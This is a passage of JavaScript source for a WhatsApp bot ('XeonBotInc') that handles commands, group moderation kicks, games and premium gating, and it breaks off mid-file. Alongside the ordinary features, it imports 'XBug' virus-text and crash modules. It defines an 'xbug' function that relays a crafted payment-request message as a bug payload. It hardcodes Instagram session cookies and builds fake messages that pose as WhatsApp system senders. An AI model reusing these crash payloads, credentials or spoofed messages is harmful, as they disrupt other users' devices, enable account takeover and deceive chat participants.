

require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, Mimetype, generateWAMessage, prepareWAMessageMedia, prepareMessageFromContent,  areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const os = require('os')
const util = require('util')
const path = require('path')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const yts = require('youtube-yts')
const xfar = require('xfarr-api')
const request = require('request')
const xeontod = require("tod-api")
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const thiccysapi = require('textmaker-thiccy')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
const { buffergif } = require('./lib/myfunc2')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const google = require('google-it')
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { jadibot, listJadibot } = require('./lib/rentbot')
const { performance } = require('perf_hooks')
const { igApi, getSessionId } = require('insta-fetcher');
let ig = new igApi("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
ig.setCookie("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { fetchBuffer } = require("./lib/myfunc2")
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'

//TIME
const xtime = moment.tz('Africa/Cairo').format('HH:mm:ss')
const xdate = moment.tz('Africa/Cairo').format('DD/MM/YYYY')
const time2 = moment().tz('Africa/Cairo').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = `Good Night ðŸŒŒ`
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = `Good Evening ðŸŒƒ`
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = `Good Evening ðŸŒƒ`
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = `Good Afternoon ðŸŒ…`
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = `Good Morning ðŸŒ„`
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = `Good Morning ðŸŒ„`
 } 
 
// read database game
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.math = []
let vote = db.data.others.vote = []

//read database jid
let premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let banned = JSON.parse(fs.readFileSync('./database/user/banned.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'));
let autorep =JSON.parse(fs.readFileSync('./database/autoreply.json'));

//database virus and whatsapp bugs
//warrrrrrrrr
const { xeonvirtex } = require('./XBug/xeonvirtex')
const { xeonbutton } = require('./XBug/xeonbutton')
const { xeonbrutal } = require('./XBug/xeonbrutal')
const { iphone } = require('./XBug/virtex/iphone')
const { iphone5 } = require('./XBug/virtex/iphone5')
const { xeonbutton2 } = require('./XBug/virtex/xeonbutton2')
const { bugsw } = require('./XBug/virtex/bugsw')
const xpicvirus = fs.readFileSync(`./XBug/xpicvirus.png`)
//warrrrrrrrrr

//database auto reply
let xeonysticker = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'));
let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));

module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
    try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi.test(body) ? body.match(/^[Â°${themeemoji}Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const type = Object.keys(mek.message)[0]  
const from = mek.key.remoteJid      
const content = JSON.stringify(mek.message)

	    const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium }
}
if (cek == null) return null
}
	
	         //media detect \\
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
     
        //hijack function
        const ordermessage = (m.msg.xtype === 'conversation' && m.msg.message.conversation) ? m.msg.message.conversation : (m.msg.xtype == 'imageMessage') && m.msg.message.imageMessage.caption ? m.msg.message.imageMessage.caption : (m.msg.xtype == 'videoMessage') && m.msg.message.videoMessage.caption ? m.msg.message.videoMessage.caption : (m.msg.xtype == 'extendedTextMessage') && m.msg.message.extendedTextMessage.text.startsWith(prefix) ? m.msg.message.extendedTextMessage.text : (m.msg.xtype == 'buttonsResponseMessage') && m.msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? m.msg.message.buttonsResponseMessage.selectedButtonId : (m.msg.xtype == 'listResponseMessage') && m.msg.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? m.msg.message.listResponseMessage.singleSelectReply.selectedRowId : (m.msg.xtype == 'templateButtonReplyMessage') && m.msg.message.templateButtonReplyMessage.selectedId.startsWith(prefix) ? m.msg.message.templateButtonReplyMessage.selectedId : ''   
        const order = ordermessage.slice(0).trim().split(/ +/).shift().toLowerCase()	   
	 
	
	    //Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
		
	
// Group
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
	    const isBan = banned.includes(m.sender)
        const isPremium = premium.includes(m.sender)
        const Autoreply = m.isGroup ? autorep.includes(from) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        const solot = [
		'ðŸŠ : ðŸ’ : ðŸ',
		'ðŸ’ : ðŸ”” : ðŸŠ',
		'ðŸ‡ : ðŸ‡ : ðŸ‡',
		'ðŸŠ : ðŸ‹ : ðŸ””',
		'ðŸ”” : ðŸ’ : ðŸ',
		'ðŸ”” : ðŸ’ : ðŸŠ',
        'ðŸŠ : ðŸ‹ : ðŸ””',		
		'ðŸ : ðŸ’ : ðŸ‹',
		'ðŸ : ðŸ : ðŸ',
		'ðŸŠ : ðŸ’ : ðŸ’',
		'ðŸ”” : ðŸ”” : ðŸ‡',
		'ðŸŒ : ðŸ’ : ðŸ””',
		'ðŸ : ðŸ”” : ðŸ””',
		'ðŸŠ : ðŸ‹ : ðŸ’',
		'ðŸ‹ : ðŸ‹ : ðŸŒ',
		'ðŸ”” : ðŸ”” : ðŸ‡',
		'ðŸ”” : ðŸ : ðŸ‡',
		'ðŸ”” : ðŸ”” : ðŸ””  Win',
		'ðŸ’ : ðŸ’ : ðŸ’ Win',
		'ðŸŒ : ðŸŒ : ðŸŒ Lose'
		]

//afk and other
try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            
    let chats = global.db.data.chats[m.chat]
    if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
    if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
    } else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
    }
    
    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
//function leveling & pick
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

// Public & Self
if (!XeonBotInc.public) {
    if (!m.key.fromMe) return
}
function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
const hsjdh = randomNomor(5)

//auto react all message
/////XeonBotInc.sendMessage(m.chat, {
          ////react: {
            ////////////////////////////////////////text: `${pickRandom(['ðŸ˜¨','ðŸ˜…','ðŸ˜‚','ðŸ˜³','ðŸ˜Ž', 'ðŸ¥µ', 'ðŸ˜±', 'ðŸ¦', 'ðŸ™„', 'ðŸ¤','ðŸ—¿','ðŸ¦','ðŸ¤¨','ðŸ¥´','ðŸ˜','ðŸ‘†','ðŸ˜”', 'ðŸ‘€','ðŸ‘Ž'])}`,
            ////key: m.key,
          /////}})

//auto recording all
    if (global.autoRecord) { if (m.chat) { XeonBotInc.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { XeonBotInc.sendPresenceUpdate('composing', m.chat) }
}

// total hit
        global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/XeonBotInc-md/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/XeonBotInc-md${moment.tz('Africa/Cairo').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}

//premium
const prem1 = `Hi bro  ${pushname} ${ucapanWaktu} \n\nThis feature is for premium members only, please buy premium to use this feature`
const prem2 = `Click the button below to buy premium`
const prem3 = [{buttonId: `${prefix}buypreim`,buttonText: {displayText: `BUY PREMIUM`,},type: 1,},]
blomdaftar = `${ucapanWaktu} @${sender.split("@")[0]} Kamu belum terdaftar di database cek private message mu untuk mendaftar`
limitabis = `*[YOUR LIMIT IS EXPIRED]*\nBuy limit in ${prefix}buylimit or buy premium to get unlimited limit`

//WARRRRRRR
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
const xbug = (teks) => {
  XeonBotInc.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//-------------------End--------------------\\
//Dont edit ot recode or bug wont work

const fmedia =  {
  key : {
    fromMe: false,
participant : '0@s.whatsapp.net'
},
     contextInfo: {
    forwardingScore: 9999,
    isForwarded: false, //:'v
showAdAttribution: true,
title: botname,
mediaType: "VIDEO",
mediaUrl: websitex,
previewType: "PHOTO",
thumbnail: thumb,
sourceUrl: "",
detectLinks: false,
    }}
    
    //reply fake
	//group target \\
const reply = (teks) => {
           XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }

	//button
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const butonna = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
XeonBotInc.sendMessage(id, butonna, options)
}
const http = randomNomor(500)

//document
const kontol = {
	key : {
   participant : '0@s.whatsapp.net'
},
       message: {
    documentMessage: {
    title: `${pushname}`, 
    jpegThumbnail: thumb
  }
}
      }
sendMenuDoc = async (ID, doc, fileName, fileLength, caption, footer, time, buttons, boddy, thumbnail, thumbnailUrl, sourceUrl, mediaUrl, options) => {
let buttonMessage = {
  document: doc,
  mimetype: "application/pdf",
  fileName: fileName,
  fileLength: fileLength,
  caption: caption,
  footer: footer,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
     title: time,
     body: boddy,
     thumbnail: thumbnail,
     thumbnailUrl: thumbnailUrl,
     sourceUrl: sourceUrl,
     mediaUrl: mediaUrl,  
     renderLargerThumbnail: true,
     showAdAttribution: true,
     mediaType: 1
   }}
       }
   XeonBotInc.sendMessage(m.chat, buttonMessage, options)
   }
                
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        // Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await XeonBotInc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`ã€Œ Group Link Detected ã€\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`ã€Œ Group Link Detected ã€\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (isCreator) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`ã€Œ Group Link Detected ã€\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Group Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        
          // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ Wa.me Link Detected ã€\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Wa.me Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ Wa.me Link Detected ã€\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Wa.me Link Detected ã€\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Virus Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (bad.includes(messagesD)) {
tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friendðŸ¤¢','Dont be toxicðŸ¦„']
sin =  tos[Math.floor(Math.random() * (tos.length))]
m.reply(sin)
if (m.text) {
bvl = `\`\`\`ã€Œ Bad Word Detected ã€\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick youðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Bad Word Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ YoutTube Video Link Detected ã€\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ YouTube Video Link Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ YoutTube Channel Link Detected ã€\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ YouTube Channel Link Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`ã€Œ Instagram Link Detected ã€\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any linkðŸ˜‡`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`ã€Œ Instagram Link Detected ã€\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
